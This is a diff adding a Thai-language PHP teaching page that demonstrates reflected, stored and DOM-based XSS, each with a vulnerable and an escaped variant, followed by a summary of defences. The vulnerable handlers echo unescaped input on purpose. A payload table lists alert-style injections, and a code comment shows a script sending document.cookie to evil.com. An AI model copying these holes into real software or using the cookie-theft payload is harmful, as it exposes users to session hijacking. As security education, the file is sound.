@@ -1,0 +1,431 @@
+<?php
+/**
+ * =====================================================
+ *  Cross-Site Scripting (XSS) Demo — PHP
+ *  แสดงช่องโหว่ทั้ง 3 ประเภทและวิธีแก้ไข
+ * =====================================================
+ *  1. Reflected XSS  — ค่าจาก URL สะท้อนกลับทันที
+ *  2. Stored XSS     — บันทึกลง "DB" แล้วแสดงซ้ำ
+ *  3. DOM-based XSS  — JavaScript อ่าน URL เอง
+ * =====================================================
+ */
+
+session_start();
+
+// จำลอง "database" ใน session
+if (!isset($_SESSION['comments'])) {
+    $_SESSION['comments'] = [
+        ['name' => 'Alice', 'text' => 'บทความดีมากครับ!',      'safe' => true],
+        ['name' => 'Bob',   'text' => 'ขอบคุณสำหรับข้อมูล',    'safe' => true],
+    ];
+}
+
+$scenario = $_GET['scenario'] ?? '';
+$action   = $_POST['action']  ?? '';
+
+// ── บันทึก comment (Stored XSS) ─────────────────────
+if ($action === 'comment') {
+    $name = $_POST['name'] ?? '';
+    $text = $_POST['text'] ?? '';
+    $safe = isset($_POST['safe']);
+
+    if ($safe) {
+        // ✓ Escape ก่อนบันทึก
+        $name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
+        $text = htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
+    }
+    // ❌ Vulnerable: บันทึกดิบๆ
+
+    $_SESSION['comments'][] = [
+        'name' => $name,
+        'text' => $text,
+        'safe' => $safe,
+    ];
+    header('Location: ?scenario=stored');
+    exit;
+}
+
+// ── ล้าง comments ─────────────────────────────────────
+if ($action === 'clear') {
+    $_SESSION['comments'] = [
+        ['name' => 'Alice', 'text' => 'บทความดีมากครับ!',   'safe' => true],
+        ['name' => 'Bob',   'text' => 'ขอบคุณสำหรับข้อมูล', 'safe' => true],
+    ];
+    header('Location: ?scenario=stored');
+    exit;
+}
+
+// ── ค่า reflected ─────────────────────────────────────
+$q_raw  = $_GET['q'] ?? '';       // ❌ ไม่ escape
+$q_safe = htmlspecialchars($q_raw, ENT_QUOTES, 'UTF-8'); // ✓ escape
+?>
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<title>XSS Demo — Cross-Site Scripting</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Arial,sans-serif;background:#f5f5f5;color:#333}
+.topbar{background:#c0392b;color:white;padding:12px 24px;display:flex;align-items:center;gap:12px}
+.topbar h1{font-size:17px}
+.topbar span{font-size:12px;opacity:.8}
+.nav{background:#2c3e50;display:flex;gap:2px;padding:0 16px}
+.nav a{color:#bdc3c7;padding:10px 16px;font-size:13px;text-decoration:none;display:block}
+.nav a:hover,.nav a.active{background:#e74c3c;color:white}
+.container{max-width:960px;margin:24px auto;padding:0 16px}
+h2{color:#2c3e50;margin-bottom:4px;font-size:16px}
+p.sub{color:#777;font-size:13px;margin-bottom:16px}
+.card{background:white;border-radius:8px;padding:20px;margin-bottom:16px;box-shadow:0 2px 6px rgba(0,0,0,.1)}
+.bad {border-left:5px solid #e74c3c}
+.good{border-left:5px solid #27ae60}
+.ld{display:inline-block;background:#e74c3c;color:#fff;padding:2px 10px;border-radius:4px;font-size:11px;margin-bottom:8px}
+.ls{display:inline-block;background:#27ae60;color:#fff;padding:2px 10px;border-radius:4px;font-size:11px;margin-bottom:8px}
+.attack-box{background:#fff3cd;border:1px solid #ffc107;border-radius:4px;padding:10px 12px;font-size:13px;margin:10px 0}
+pre{background:#1e1e2e;color:#cdd6f4;padding:14px;border-radius:6px;font-size:12.5px;line-height:1.6;overflow-x:auto;margin:8px 0}
+.bad-code {color:#f38ba8}
+.ok-code  {color:#a6e3a1}
+.cmt-code {color:#6c7086}
+input[type=text],textarea{width:100%;padding:8px 10px;border:1px solid #ddd;border-radius:4px;font-size:13px;margin-bottom:8px}
+textarea{height:70px;resize:vertical}
+button{padding:8px 18px;border:none;border-radius:4px;cursor:pointer;font-size:13px}
+.btn-d{background:#e74c3c;color:white;margin-right:6px}
+.btn-s{background:#27ae60;color:white;margin-right:6px}
+.btn-g{background:#95a5a6;color:white}
+.output-box{background:#f9f9f9;border:1px solid #ddd;border-radius:4px;padding:12px;min-height:40px;font-size:13px;margin-top:8px}
+.output-box.danger{background:#fde8e8;border-color:#e74c3c}
+.output-box.safe  {background:#e8f5e9;border-color:#27ae60}
+.comment-item{padding:8px 10px;border-bottom:1px solid #eee;font-size:13px}
+.comment-item:last-child{border-bottom:none}
+.comment-item .cname{font-weight:bold;color:#2c3e50;margin-right:8px}
+.xss-flag{font-size:10px;background:#e74c3c;color:white;padding:1px 6px;border-radius:3px;margin-left:6px}
+.safe-flag{font-size:10px;background:#27ae60;color:white;padding:1px 6px;border-radius:3px;margin-left:6px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{background:#2c3e50;color:white;padding:8px 10px;text-align:left}
+td{padding:8px 10px;border-bottom:1px solid #eee}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:600px){.two-col{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+    <h1>🔓 XSS Demo — Cross-Site Scripting</h1>
+    <span>ตัวอย่างช่องโหว่และวิธีป้องกัน</span>
+</div>
+
+<div class="nav">
+    <a href="?scenario=reflected" class="<?= $scenario==='reflected'?'active':'' ?>">1. Reflected XSS</a>
+    <a href="?scenario=stored"    class="<?= $scenario==='stored'   ?'active':'' ?>">2. Stored XSS</a>
+    <a href="?scenario=dom"       class="<?= $scenario==='dom'      ?'active':'' ?>">3. DOM-based XSS</a>
+    <a href="?scenario=summary"   class="<?= $scenario==='summary'  ?'active':'' ?>">สรุป</a>
+</div>
+
+<div class="container">
+
+<?php if ($scenario === 'reflected'): ?>
+<!-- ═══════════════════════════════════
+     REFLECTED XSS
+═══════════════════════════════════ -->
+<h2>1. Reflected XSS</h2>
+<p class="sub">ค่าจาก URL parameter ถูกแสดงผลกลับทันทีโดยไม่มีการ escape</p>
+
+<div class="card bad">
+    <span class="ld">❌ VULNERABLE</span>
+    <h3 style="margin-bottom:6px">ค้นหา — แสดงผลโดยตรงจาก $_GET</h3>
+    <div class="attack-box">
+        <strong>ลองโจมตี:</strong> พิมพ์ payload ด้านล่าง หรือเพิ่มใน URL:
+        <code>?scenario=reflected&q=&lt;script&gt;alert('XSS!')&lt;/script&gt;</code>
+    </div>
+
+    <form method="GET">
+        <input type="hidden" name="scenario" value="reflected">
+        <input type="text" name="q" value="<?= $q_raw /* ❌ ไม่ escape */ ?>"
+               placeholder="ลองพิมพ์: &lt;script&gt;alert(1)&lt;/script&gt;">
+        <button type="submit" class="btn-d">ค้นหา (Vulnerable)</button>
+    </form>
+
+    <?php if ($q_raw !== ''): ?>
+    <div class="output-box danger">
+        <strong>ผลการค้นหาสำหรับ:</strong>
+        <?= $q_raw /* ❌ แสดงผลดิบๆ — script จะรันได้! */ ?>
+    </div>
+    <?php endif; ?>
+
+    <pre><span class="cmt-code">// ❌ Vulnerable — แสดงผล $_GET โดยตรง</span>
+<span class="bad-code">echo "ผลการค้นหาสำหรับ: " . $_GET['q'];</span>
+
+<span class="cmt-code">// payload ใน URL:
+// ?q=&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;
+// browser เห็น tag จริง → รัน JS ทันที!</span></pre>
+</div>
+
+<div class="card good">
+    <span class="ls">✅ SAFE</span>
+    <h3 style="margin-bottom:6px">ค้นหา — ใช้ htmlspecialchars() ก่อนแสดงผล</h3>
+
+    <form method="GET">
+        <input type="hidden" name="scenario" value="reflected">
+        <input type="text" name="q" value="<?= $q_safe ?>"
+               placeholder="ลองพิมพ์ payload เดิม">
+        <button type="submit" class="btn-s">ค้นหา (Safe)</button>
+    </form>
+
+    <?php if ($q_safe !== ''): ?>
+    <div class="output-box safe">
+        <strong>ผลการค้นหาสำหรับ:</strong>
+        <?= $q_safe /* ✓ escaped แล้ว — แสดงเป็นข้อความ */ ?>
+    </div>
+    <?php endif; ?>
+
+    <pre><span class="cmt-code">// ✓ Safe — escape ก่อนแสดงผลเสมอ</span>
+<span class="ok-code">$q = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
+echo "ผลการค้นหาสำหรับ: " . $q;</span>
+
+<span class="cmt-code">// &lt;script&gt; กลายเป็น &amp;lt;script&amp;gt; → แสดงเป็นข้อความ ไม่รัน</span></pre>
+</div>
+
+<div class="card">
+    <h3 style="margin-bottom:8px">Payload ที่ใช้บ่อย</h3>
+    <table>
+        <tr><th>Payload</th><th>ผล</th></tr>
+        <tr><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>รัน JavaScript</td></tr>
+        <tr><td><code>&lt;img src=x onerror=alert(1)&gt;</code></td><td>รันผ่าน event handler</td></tr>
+        <tr><td><code>&lt;svg onload=alert(1)&gt;</code></td><td>SVG + event</td></tr>
+        <tr><td><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>ปิด attribute แล้วแทรก tag</td></tr>
+        <tr><td><code>javascript:alert(1)</code></td><td>ใน href attribute</td></tr>
+    </table>
+</div>
+
+<?php elseif ($scenario === 'stored'): ?>
+<!-- ═══════════════════════════════════
+     STORED XSS
+═══════════════════════════════════ -->
+<h2>2. Stored XSS</h2>
+<p class="sub">ข้อมูลถูกบันทึกลงฐานข้อมูลแล้วแสดงซ้ำกับผู้ใช้ทุกคน</p>
+
+<div class="two-col">
+<div class="card bad">
+    <span class="ld">❌ VULNERABLE</span>
+    <h3 style="margin-bottom:8px">โพสต์ comment (บันทึกดิบๆ)</h3>
+    <div class="attack-box" style="font-size:12px">
+        <strong>ลองโจมตี:</strong><br>
+        ชื่อ: <code>Hacker</code><br>
+        comment: <code>&lt;script&gt;alert('XSS Stored!')&lt;/script&gt;</code>
+    </div>
+    <form method="POST">
+        <input type="hidden" name="action" value="comment">
+        <input type="text" name="name" placeholder="ชื่อของคุณ">
+        <textarea name="text" placeholder="comment ของคุณ&#10;ลอง: &lt;img src=x onerror=alert(1)&gt;"></textarea>
+        <button type="submit" class="btn-d">โพสต์ (Vulnerable)</button>
+    </form>
+</div>
+
+<div class="card good">
+    <span class="ls">✅ SAFE</span>
+    <h3 style="margin-bottom:8px">โพสต์ comment (escape ก่อนบันทึก)</h3>
+    <form method="POST">
+        <input type="hidden" name="action" value="comment">
+        <input type="hidden" name="safe" value="1">
+        <input type="text" name="name" placeholder="ชื่อของคุณ">
+        <textarea name="text" placeholder="comment ของคุณ&#10;ลอง payload เดิม — จะแสดงเป็นข้อความ"></textarea>
+        <button type="submit" class="btn-s">โพสต์ (Safe)</button>
+    </form>
+</div>
+</div>
+
+<!-- แสดง comments -->
+<div class="card">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+        <h3>Comments (<?= count($_SESSION['comments']) ?> รายการ)</h3>
+        <form method="POST" style="margin:0">
+            <input type="hidden" name="action" value="clear">
+            <button type="submit" class="btn-g" style="font-size:12px;padding:5px 12px">ล้างทั้งหมด</button>
+        </form>
+    </div>
+    <?php foreach ($_SESSION['comments'] as $c): ?>
+    <div class="comment-item">
+        <span class="cname"><?= $c['name'] /* แสดงตามที่บันทึก */ ?></span>
+        <?= $c['safe']
+            ? '<span class="safe-flag">escaped</span>'
+            : '<span class="xss-flag">raw</span>' ?>
+        <br>
+        <span style="color:#555"><?= $c['text'] /* ❌/✓ ขึ้นอยู่กับที่บันทึก */ ?></span>
+    </div>
+    <?php endforeach; ?>
+</div>
+
+<div class="card">
+    <pre><span class="cmt-code">// ❌ Vulnerable — บันทึกและแสดงดิบๆ</span>
+<span class="bad-code">$name = $_POST['name'];          // ไม่ escape
+$text = $_POST['text'];          // ไม่ escape
+INSERT INTO comments (name, text)...
+echo "&lt;b&gt;" . $row['name'] . "&lt;/b&gt;: " . $row['text'];</span>
+
+<span class="cmt-code">// ✓ Safe — escape ก่อนบันทึก หรือ escape ก่อนแสดง</span>
+<span class="ok-code">$name = htmlspecialchars($_POST['name'], ENT_QUOTES, 'UTF-8');
+$text = htmlspecialchars($_POST['text'], ENT_QUOTES, 'UTF-8');
+INSERT INTO comments (name, text)...
+// หรือ escape ตอนแสดงผล:
+echo "&lt;b&gt;" . htmlspecialchars($row['name']) . "&lt;/b&gt;: "
+   . htmlspecialchars($row['text']);</span></pre>
+</div>
+
+<?php elseif ($scenario === 'dom'): ?>
+<!-- ═══════════════════════════════════
+     DOM-BASED XSS
+═══════════════════════════════════ -->
+<h2>3. DOM-based XSS</h2>
+<p class="sub">JavaScript ฝั่ง client อ่าน URL fragment (#) แล้วเขียน DOM โดยตรง — ไม่ผ่าน server เลย</p>
+
+<div class="card bad">
+    <span class="ld">❌ VULNERABLE</span>
+    <h3 style="margin-bottom:6px">อ่านค่าจาก URL hash แล้วใส่ innerHTML</h3>
+    <div class="attack-box">
+        <strong>ลองโจมตี:</strong> เพิ่มใน URL:<br>
+        <code>#&lt;img src=x onerror=alert('DOM XSS!')&gt;</code><br>
+        <small>server log จะไม่เห็น payload เลย เพราะ # ไม่ส่งไป server</small>
+    </div>
+    <div id="vuln-output" style="padding:10px;background:#fde8e8;border:1px solid #e74c3c;border-radius:4px;margin:8px 0;min-height:36px">
+        <em style="color:#999">ผลลัพธ์จาก URL hash จะแสดงที่นี่...</em>
+    </div>
+    <pre><span class="cmt-code">// ❌ Vulnerable — innerHTML + location.hash</span>
+<span class="bad-code">const val = location.hash.substring(1);
+document.getElementById('output').innerHTML = val;
+// ✗ ถ้า hash = &lt;img src=x onerror=alert(1)&gt;
+// browser parse HTML → trigger onerror → รัน JS!</span></pre>
+</div>
+
+<div class="card good">
+    <span class="ls">✅ SAFE</span>
+    <h3 style="margin-bottom:6px">ใช้ textContent แทน innerHTML</h3>
+    <div id="safe-output" style="padding:10px;background:#e8f5e9;border:1px solid #27ae60;border-radius:4px;margin:8px 0;min-height:36px">
+        <em style="color:#999">ผลลัพธ์ปลอดภัยจะแสดงที่นี่...</em>
+    </div>
+    <pre><span class="cmt-code">// ✓ Safe — textContent ไม่ parse HTML</span>
+<span class="ok-code">const val = location.hash.substring(1);
+document.getElementById('output').textContent = val;
+// &lt;img src=x onerror=alert(1)&gt; แสดงเป็นข้อความ ไม่รัน</span>
+
+<span class="cmt-code">// ✓ หรือ encode ก่อนใส่ innerHTML</span>
+<span class="ok-code">function escapeHtml(str) {
+    const d = document.createElement('div');
+    d.appendChild(document.createTextNode(str));
+    return d.innerHTML;
+}
+document.getElementById('output').innerHTML = escapeHtml(val);</span></pre>
+</div>
+
+<div class="card">
+    <h3 style="margin-bottom:8px">แหล่งข้อมูลอันตรายใน DOM (Sources)</h3>
+    <table>
+        <tr><th>Source</th><th>ตัวอย่าง</th><th>อันตราย</th></tr>
+        <tr><td><code>location.hash</code></td><td><code>#&lt;script&gt;...&lt;/script&gt;</code></td><td>ใช่ — ไม่ผ่าน server</td></tr>
+        <tr><td><code>location.search</code></td><td><code>?q=&lt;script&gt;</code></td><td>ใช่ ถ้า JS อ่านเอง</td></tr>
+        <tr><td><code>document.referrer</code></td><td>URL ของหน้าก่อน</td><td>ใช่</td></tr>
+        <tr><td><code>localStorage</code></td><td>ข้อมูลที่เก็บไว้</td><td>ใช่ ถ้า inject ได้</td></tr>
+        <tr><td><code>postMessage</code></td><td>ข้อมูลจาก iframe</td><td>ใช่ ถ้าไม่ตรวจ origin</td></tr>
+    </table>
+</div>
+
+<script>
+// ❌ Vulnerable
+const raw = decodeURIComponent(location.hash.substring(1));
+if (raw) {
+    document.getElementById('vuln-output').innerHTML = raw;
+}
+
+// ✓ Safe
+if (raw) {
+    document.getElementById('safe-output').textContent = raw;
+}
+</script>
+
+<?php elseif ($scenario === 'summary'): ?>
+<!-- ═══════════════════════════════════
+     SUMMARY
+═══════════════════════════════════ -->
+<h2>สรุป XSS ทั้ง 3 ประเภท</h2>
+<p class="sub">เปรียบเทียบและแนวทางป้องกัน</p>
+
+<div class="card">
+    <table>
+        <tr><th>ประเภท</th><th>แหล่งที่มา</th><th>ผ่าน Server</th><th>วิธีป้องกัน</th></tr>
+        <tr>
+            <td><strong>Reflected</strong></td>
+            <td>URL parameter</td>
+            <td>✓ ใช่</td>
+            <td>htmlspecialchars() ก่อนแสดงผล</td>
+        </tr>
+        <tr>
+            <td><strong>Stored</strong></td>
+            <td>ฐานข้อมูล</td>
+            <td>✓ ใช่</td>
+            <td>htmlspecialchars() ก่อนบันทึก/แสดง</td>
+        </tr>
+        <tr>
+            <td><strong>DOM-based</strong></td>
+            <td>URL hash, JS API</td>
+            <td>✗ ไม่ผ่าน</td>
+            <td>textContent แทน innerHTML</td>
+        </tr>
+    </table>
+</div>
+
+<div class="card good">
+    <span class="ls">✅ วิธีป้องกัน XSS</span>
+    <pre><span class="cmt-code">// 1. PHP — escape ทุกครั้งที่แสดงผล</span>
+<span class="ok-code">echo htmlspecialchars($var, ENT_QUOTES, 'UTF-8');</span>
+
+<span class="cmt-code">// 2. JavaScript — ใช้ textContent ไม่ใช่ innerHTML</span>
+<span class="ok-code">element.textContent = userInput;   // ✓
+element.innerHTML   = userInput;   // ❌</span>
+
+<span class="cmt-code">// 3. HTTP Header — Content Security Policy</span>
+<span class="ok-code">header("Content-Security-Policy: default-src 'self'; script-src 'self'");</span>
+
+<span class="cmt-code">// 4. Cookie — HttpOnly ป้องกัน JS อ่าน session cookie</span>
+<span class="ok-code">setcookie('session', $id, ['httponly' => true, 'secure' => true]);</span>
+
+<span class="cmt-code">// 5. ถ้าต้องรับ HTML — ใช้ DOMPurify sanitize</span>
+<span class="ok-code">const clean = DOMPurify.sanitize(userHtml);
+element.innerHTML = clean;</span></pre>
+</div>
+
+<?php else: ?>
+<!-- หน้าแรก -->
+<div class="card">
+    <h2 style="margin-bottom:8px">เลือก Scenario จากเมนูด้านบน</h2>
+    <p style="color:#666;font-size:13px;margin-bottom:16px">ตัวอย่าง XSS ทั้ง 3 ประเภทตาม OWASP A03:2021</p>
+    <div class="two-col">
+        <a href="?scenario=reflected" style="text-decoration:none">
+            <div class="card bad" style="cursor:pointer">
+                <strong>1. Reflected XSS</strong>
+                <p style="font-size:12px;color:#666;margin-top:4px">URL parameter → แสดงผลทันที</p>
+            </div>
+        </a>
+        <a href="?scenario=stored" style="text-decoration:none">
+            <div class="card bad" style="cursor:pointer">
+                <strong>2. Stored XSS</strong>
+                <p style="font-size:12px;color:#666;margin-top:4px">บันทึกใน DB → แสดงกับทุกคน</p>
+            </div>
+        </a>
+        <a href="?scenario=dom" style="text-decoration:none">
+            <div class="card bad" style="cursor:pointer">
+                <strong>3. DOM-based XSS</strong>
+                <p style="font-size:12px;color:#666;margin-top:4px">JavaScript อ่าน URL เอง</p>
+            </div>
+        </a>
+        <a href="?scenario=summary" style="text-decoration:none">
+            <div class="card good" style="cursor:pointer">
+                <strong>สรุปและวิธีป้องกัน</strong>
+                <p style="font-size:12px;color:#666;margin-top:4px">เปรียบเทียบและ code ป้องกัน</p>
+            </div>
+        </a>
+    </div>
+</div>
+<?php endif; ?>
+
+</div><!-- end container -->
+</body>
+</html>
